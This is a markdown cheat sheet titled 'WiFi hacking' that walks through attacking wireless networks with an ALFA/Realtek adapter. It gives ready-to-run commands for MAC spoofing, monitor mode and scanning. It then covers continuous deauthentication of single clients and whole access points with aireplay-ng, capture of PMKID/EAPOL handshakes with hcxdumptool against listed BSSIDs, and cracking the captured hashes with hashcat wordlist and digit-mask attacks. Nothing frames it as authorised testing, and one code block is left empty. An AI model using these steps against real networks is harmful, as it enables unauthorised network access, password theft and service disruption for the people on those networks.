# WiFi hacking

## install REaltek drivers 

This is a typical wifi SOC within ALFA devices.


```bash
sudo apt install realtek-rtl88xxau-dkms
```

## Hide your Mac

```bash

sudo ip link set dev $interface down

sudo macchanger --mac=aa:bb:cc:dd:ee:ff $interface

sudo ip link set dev $interface up

```


## Put Wireless Interface in Monitor Mode

1. check for available interfaces

`airmon-ng check`

2. kill interfering processes

`airmon-ng check kill`

3. If interface is on `wlan0`, set it to monitoring mode

`airmon-ng start wlan0`

On success you get something like 

```
PHY	Interface	Driver		Chipset

phy0	wlan0		88XXau		Realtek Semiconductor Corp. RTL8812AU 802.11a/b/g/n/ac 2T2R DB WLAN Adapter
		(monitor mode enabled)

```

## Scanning for Networks


```bash

sudo airodump-ng --band abg $interface


#You can combine these to monitor multiple bands. For example:

#--band abg: Monitor all 2.4 GHz and 5 GHz networks.
#--band bg: Monitor only 2.4 GHz networks (both 802.11b and 802.11g).
#--band a: Monitor only 5 GHz networks.


```




This will display a list of all available Wi-Fi networks, along with various details about them:

```text
BSSID: The MAC address of the access point.
PWR: Signal level reported by the card.
Beacons: Number of announcements packets sent by the AP.
#Data: Number of captured data packets (includes data and QoS data).
CH: Channel on which the AP is operating.
ENC: Encryption algorithm used (WEP, WPA, WPA2, etc.).
ESSID: The name of the Wi-Fi network.
```



## De-auth attack

### single client

```bash

# you have to be monitoring specific BSSID on specific channel

sudo airodump-ng --bssid $AP_mac  -c $channel $interface


sudo aireplay-ng -0 0 -a $AP_mac -c $victim_mac $interface


# where -0 0 is continuous deauth mode

```

### multi clients

`sudo aireplay-ng -0 0 -a $AP_mac  $interface`

Discovery: sudo hcxdumptool --do_rcascan -i wlan0

Examples of the target and how traffic is captured:

1.Stop all services that are accessing the WLAN device (e.g .: NetworManager and wpa_supplicant.service)

Code:
sudo systemctl stop NetworkManager.service
sudo systemctl stop wpa_supplicant.service

2. Start the attack and wait for you to receive PMKIDs and / or EAPOL message pairs, then exit hcxdumptool

create list of interesting bssids

cat bssid_list_8282.txt 
1c61b4e38221
1c61b4e38281
c04a00f586c1

attack:
sudo hcxdumptool -i wlan0 -o 8282_cap.pcapng --filterlist_ap=bssid_list_8282.txt --filtermode=2 --active_beacon --enable_status=15

sudo hcxdumptool -i wlan0 -o sverdlova.pcapng --active_beacon --enable_status=15

3. Restart stopped services to reactivate your network connection

Code:


4. Convert the traffic to hash format 22000

Code:
$ hcxpcapngtool -o hash.hc22000 -E wordlist dumpfile.pcapng

5. Run Hashcat on the list of words obtained from WPA traffic

Code:
$ hashcat -m 22000 hash.hc22000 wordlist.txt

hashcat -m 22000 filtered_hash.hc22000 -a 3 ?d?d?d?d?d?d?d?d
-a 3: Specifies a mask attack.
?d: Represents a digit (0–9).